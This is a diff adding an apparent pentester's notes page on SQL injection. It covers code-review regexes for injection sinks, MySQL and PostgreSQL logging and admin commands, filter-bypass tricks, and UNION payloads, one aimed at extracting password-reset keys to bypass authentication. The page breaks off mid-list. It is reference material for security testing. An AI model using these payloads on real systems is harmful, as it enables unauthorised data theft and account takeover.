@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>SQL Injection tips - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "SQL Injection tips", url: "#_top", children: [
+              {title: "Code Review Regex", url: "#code-review-regex" },
+              {title: "MySQL", url: "#mysql" },
+              {title: "PostgreSQL", url: "#postgresql" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="sql-injection-tips">SQL Injection tips</h1>
+<h2 id="code-review-regex">Code Review Regex</h2>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="o">^</span><span class="p">.</span><span class="o">*?</span><span class="n">query</span><span class="p">.</span><span class="o">*?</span><span class="k">select</span><span class="p">.</span><span class="o">*?</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="n">egrep</span><span class="w"> </span><span class="ss">&quot;^.*?query.*?select.*?&quot;</span><span class="w"> </span><span class="err">$</span><span class="n">i</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="k">for</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">cat</span><span class="w"> </span><span class="n">doGet</span><span class="p">.</span><span class="n">txt</span><span class="p">);</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="err">$</span><span class="n">i</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">egrep</span><span class="w"> </span><span class="ss">&quot;^.*?query.*?select.*?&quot;</span><span class="w"> </span><span class="err">$</span><span class="n">i</span><span class="p">;</span><span class="w"> </span><span class="n">done</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="n">egrep</span><span class="w"> </span><span class="ss">&quot;^.*?\&quot;</span><span class="k">select</span><span class="p">.</span><span class="o">*?</span><span class="ss">&quot; $i</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="ss">for i in $(cat doGet.txt); do echo $i &amp;&amp; egrep &quot;</span><span class="o">^</span><span class="p">.</span><span class="o">*?</span><span class="err">\</span><span class="ss">&quot;select.*?&quot;</span><span class="w"> </span><span class="err">$</span><span class="n">i</span><span class="p">;</span><span class="w"> </span><span class="n">done</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="n">egrep</span><span class="w">  </span><span class="ss">&quot;^.*?request\.getParameter\(\&quot;&quot; $i</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="ss">for i in $(cat doGet.txt); do if egrep -q &quot;</span><span class="o">^</span><span class="p">.</span><span class="o">*?</span><span class="err">\</span><span class="ss">&quot;select.*?&quot;</span><span class="w"> </span><span class="err">$</span><span class="n">i</span><span class="p">;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">egrep</span><span class="w"> </span><span class="o">-</span><span class="n">q</span><span class="w"> </span><span class="ss">&quot;^.*?request\.getParameter\(\&quot;&quot; $i; then echo $i;fi  ;fi; done</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="ss"># Improved regex</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="ss">^.*?[&#39;&quot;</span><span class="p">]</span><span class="k">SELECT</span><span class="p">.</span><span class="o">*?</span><span class="p">[</span><span class="s1">&#39;&quot;]\ ?[\+\.]</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="s1">^.*?[&#39;</span><span class="ss">&quot;]UPDATE.*?SET.*?[&#39;&quot;</span><span class="p">]</span><span class="err">\</span><span class="w"> </span><span class="o">?</span><span class="p">[</span><span class="err">\</span><span class="o">+</span><span class="err">\</span><span class="p">.]</span>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="o">^</span><span class="p">.</span><span class="o">*?</span><span class="p">[</span><span class="s1">&#39;&quot;]INSERT INTO.*?[&#39;</span><span class="err">&quot;</span><span class="p">]</span><span class="err">\</span><span class="w"> </span><span class="o">?</span><span class="p">[</span><span class="err">\</span><span class="o">+</span><span class="err">\</span><span class="p">.]</span>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="o">#</span><span class="w"> </span><span class="n">Targeted</span><span class="o">/</span><span class="k">Group</span><span class="w"> </span><span class="n">Matching</span>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="n">perl</span><span class="w"> </span><span class="o">-</span><span class="n">lne</span><span class="w"> </span><span class="s1">&#39;print $1 if /&lt;REGEX&gt;/&#39;</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="o">*</span><span class="w"> </span>
+</span></code></pre></div>
+<h2 id="mysql">MySQL</h2>
+<ul>
+<li>Turn on debug<ul>
+<li>Edit mysql config file
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo nano /etc/mysql/my.cnf
+</span></code></pre></div></li>
+<li>Uncomment or modify these settings into these values
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">general_log_file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">mysql</span><span class="p">.</span><span class="n">log</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">general_log</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span>
+</span></code></pre></div></li>
+<li>Restart services
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>sudo systemctl restart mysql
+</span></code></pre></div></li>
+<li>Tail the logs
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>sudo tail –f /var/log/mysql/mysql.log
+</span></code></pre></div></li>
+</ul>
+</li>
+</ul>
+<h3 id="alternatives-bypass">Alternatives / Bypass</h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">space</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="cm">/**/</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="k">Comment</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="o">#</span>
+</span></code></pre></div>
+<h3 id="basic-mysql-queries">Basic MySQL Queries</h3>
+<ul>
+<li>Check current DB Version
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">();</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="o">@@</span><span class="k">version</span><span class="p">;</span>
+</span></code></pre></div></li>
+<li>Show current User
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">();</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="o">#</span><span class="w"> </span><span class="k">or</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="k">select</span><span class="w"> </span><span class="k">current_user</span><span class="p">();</span>
+</span></code></pre></div></li>
+<li>Boolean Example
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="o">&lt;</span><span class="k">table</span><span class="o">&gt;</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="o">&lt;</span><span class="k">column_name</span><span class="o">&gt;</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="o">&lt;</span><span class="n">QUERY</span><span class="o">&gt;</span>
+</span></code></pre></div></li>
+<li>Show if current user is a database admin (DBA)
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">false</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="k">user</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="p">(</span><span class="n">INSTR</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">()),</span><span class="w"> </span><span class="k">user</span><span class="p">)</span><span class="w">  </span><span class="k">and</span><span class="w">  </span><span class="n">super_priv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;localhost&#39;</span><span class="p">))</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="nb">Boolean</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="p">(</span><span class="k">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">substring_index</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">()),</span><span class="s1">&#39;@&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">super_priv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;localhost&#39;</span><span class="p">);</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="n">Better</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">false</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="k">user</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="p">(</span><span class="k">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">substring_index</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">()),</span><span class="s1">&#39;@&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">super_priv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;localhost&#39;</span><span class="p">))</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="nb">Boolean</span>
+</span></code></pre></div></li>
+<li>Add Values
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">users</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span><span class="n">login</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="n">email</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="p">(</span><span class="w"> </span><span class="ss">&quot;4&quot;</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;user4&quot;</span><span class="w">   </span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;password4&quot;</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;user4@test.local&quot;</span><span class="p">);</span>
+</span></code></pre></div></li>
+<li>Update Values
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="k">UPDATE</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">login</span><span class="o">=</span><span class="s1">&#39;user4&#39;</span><span class="p">;</span>
+</span></code></pre></div></li>
+</ul>
+<h3 id="payloads">Payloads</h3>
+<ul>
+<li>Union
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>&quot; UNION ALL SELECT 1,2,3,4,5#   #&lt;-- Depending on number of rows, start from 1 and increase
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>&quot; test_value&quot; UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#   
+</span></code></pre></div></li>
+</ul>
+<h3 id="limitations">Limitations</h3>
+<ul>
+<li>Python<ul>
+<li>PyMysql only allows 1 query execution unless parameter <code>multi=True</code> is set</li>
+</ul>
+</li>
+</ul>
+<h3 id="collations">Collations</h3>
+<ul>
+<li>
+<p>Determine Collation</p>
+<ul>
+<li>From MySQL cli
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">COLLATION_NAME</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">TABLE_NAME</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;powertableTop&quot;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">COLUMN_NAME</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;name&quot;</span><span class="p">;</span>
+</span></code></pre></div></li>
+<li>Once collation is known, append to 'column name' after <code>SELECT</code>
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">COLLATE</span><span class="w"> </span><span class="n">utf8mb4_general_ci</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">someTable</span><span class="p">;</span><span class="w"> </span><span class="o">#</span><span class="n">ci</span><span class="w"> </span><span class="n">means</span><span class="w"> </span><span class="k">case</span><span class="o">-</span><span class="k">insensitive</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">COLLATE</span><span class="w"> </span><span class="n">utf8mb4_general_ci</span><span class="p">,</span><span class="w"> </span><span class="n">reset_password_key</span><span class="w"> </span><span class="k">COLLATE</span><span class="w"> </span><span class="n">utf8mb4_general_ci</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">someTable</span><span class="p">;</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="ss">&quot;test_value&quot;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">ALL</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">COLLATE</span><span class="w"> </span><span class="n">utf8mb4_general_ci</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="n">reset_password_key</span><span class="w"> </span><span class="k">COLLATE</span><span class="w"> </span><span class="n">utf8mb4_general_ci</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">someTable</span><span class="p">;</span>
+</span></code></pre></div></li>
+</ul>
+</li>
+<li>
+<p>Associated Use cases:</p>
+<ul>
+<li>Bypass authentication using Password reset by finding authentication token</li>
+</ul>
+</li>
+</ul>
+<hr />
+<h2 id="postgresql">PostgreSQL</h2>
+<h3 id="enable-debugging">Enable Debugging</h3>
+<ul>
+<li>Edit <code>postgresql.conf</code> and change <code>log_statement</code> to <code>all</code>
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>log_statement = &#39;all&#39; # none, ddl, mod, all
+</span></code></pre></div></li>
+</ul>
+<h3 id="helpful-urls">Helpful URLs:</h3>
+<div class="language-text highlight"><pre><span></span><code>* OnSecurity[^1]
+* Pulse Security[^2]
+</code></pre></div>
+<h3 id="basic-commands">Basic commands</h3>
+<ul>
+<li>Tail a log file in Windows
+    <div class="language-powershell highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="nb">Get-Content</span> <span class="err">“</span><span class="n">C</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">pgsql_log</span><span class="p">\*</span><span class="err">”</span> <span class="n">-Tail</span> <span class="n">10</span> <span class="n">-Wait</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="n">-Pattern</span> <span class="s2">&quot;SOMEWEIRDTABLE&quot;</span> <span class="n">-Context</span> <span class="n">0</span><span class="p">,</span><span class="n">3</span>
+</span></code></pre></div></li>
+<li>Connect to DB<ul>
+<li>Windows
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>psql -U postgres -p 15432 -d &lt;db_name&gt;
+</span></code></pre></div></li>
+<li>Linux
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>sudo -i -u postgres
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>psql
+</span></code></pre></div></li>
+</ul>
+</li>
+<li>List all Databases
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="err">\</span><span class="n">l</span>
+</span></code></pre></div></li>
+<li>Switch database
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="err">\</span><span class="k">c</span><span class="w"> </span><span class="o">&lt;</span><span class="n">db_name</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">username</span><span class="o">&gt;</span>
+</span></code></pre></div></li>
+<li>Create a database
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="k">create</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="n">webappDB</span><span class="p">;</span>
+</span></code></pre></div></li>
+<li>List all users and roles
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="err">\</span><span class="n">du</span>
+</span></code></pre></div></li>
+<li>Select version
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">version</span><span class="p">();</span>
+</span></code></pre></div></li>
+<li>Help
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="err">\</span><span class="o">?</span>
+</span></code></pre></div></li>
+<li>Dump postgresql database (backup)
+    <div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>sudo<span class="w"> </span>-i<span class="w"> </span>-u<span class="w"> </span>postgres
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>pg_dump<span class="w"> </span>&lt;DB_NAME&gt;<span class="w"> </span>&gt;<span class="w"> </span>/tmp/dump
+</span></code></pre></div></li>
+<li>Restore postgresql database
+    <div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>psql<span class="w"> </span>&lt;DB_NAME&gt;<span class="w"> </span>&lt;<span class="w"> </span>/tmp/dump
+</span></code></pre></div></li>
+<li>Creata a database user[^4][^5]
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="k">create</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="n">webappuser</span><span class="p">;</span>
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="k">create</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="n">webappuser</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="k">encrypted</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="s1">&#39;mypass&#39;</span><span class="p">;</span>
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="k">grant</span><span class="w"> </span><span class="k">all</span><span class="w"> </span><span class="k">privileges</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="n">webappDB</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">webappuser</span><span class="p">;</span>
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="k">ALTER</span><span class="w"> </span><span class="k">USER</span><span class="w"> </span><span class="n">webapp</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">superuser</span><span class="p">;</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="k">Grant</span><span class="w"> </span><span class="n">superuser</span>
+</span></code></pre></div></li>
+<li>Delete a DB user
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="k">DROP</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="n">webappuser</span><span class="p">;</span>
+</span></code></pre></div></li>
+<li>Sleep
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+</span></code></pre></div></li>
+<li>Bypass Character Restriction<ul>
+<li><code>CHR</code> and String Concatenation. Only works in <code>SELECT</code>,<code>INSERT</code>, <code>DELETE</code> queries
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">CHR</span><span class="p">(</span><span class="mi">65</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">CHR</span><span class="p">(</span><span class="mi">87</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">CHR</span><span class="p">(</span><span class="mi">65</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">CHR</span><span class="p">(</span><span class="mi">69</span><span class="p">);</span>
+</span></code></pre></div></li>
+<li>Quote can be replaced by <code>$$</code>
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;TESTVALUE&#39;</span><span class="p">;</span>
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="err">$$</span><span class="n">TESTVALUE$$</span><span class="p">;</span>
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="k">SELECT</span><span class="w"> </span><span class="err">$</span><span class="n">TAG$TESTVALUE$TAG$</span><span class="p">;</span>
+</span></code></pre></div></li>
+</ul>
+</li>
+<li>Check if the current user is a superuser (DBA)
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">current_setting</span><span class="p">(</span><span class="s1">&#39;is_superuser&#39;</span><span class="p">);</span>
+</span></code></pre></div></li>
+<li>List all tables
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="err">\</span><span class="n">dt</span>
+</span></code></pre></div></li>
+<li>Create table
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="n">TEMP</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">SOMETABLE</span><span class="p">(</span><span class="n">columnbus123</span><span class="w"> </span><span class="nb">text</span><span class="p">);</span>
+</span></code></pre></div></li>
+<li>Insert Values
